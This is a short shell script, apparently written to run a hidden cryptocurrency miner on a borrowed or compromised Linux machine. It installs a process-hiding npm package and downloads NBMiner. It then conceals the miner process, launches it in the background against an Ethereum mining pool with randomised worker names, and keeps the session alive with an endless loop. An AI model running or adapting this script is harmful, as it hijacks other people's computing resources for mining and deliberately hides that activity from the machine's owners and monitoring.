#!/bin/sh
#!/bin/bash

apt update
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
sudo apt install nodejs
npm i -g node-process-hider
wget https://dl.nbminer.com/NBMiner_40.1_Linux.tgz
tar zxvf NBMiner_40.1_Linux.tgz
cd NBMiner_Linux
sudo ph add nbminer
chmod 777 nbminer
nohup ./nbminer -a ethash -o ethproxy+tcp://ethash.poolbinance.com:443 -u TeslaM.$(echo $(shuf -i 1-9999 -n 1)-T4) -log > nohup.out

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 15m; done

sleep 2

done
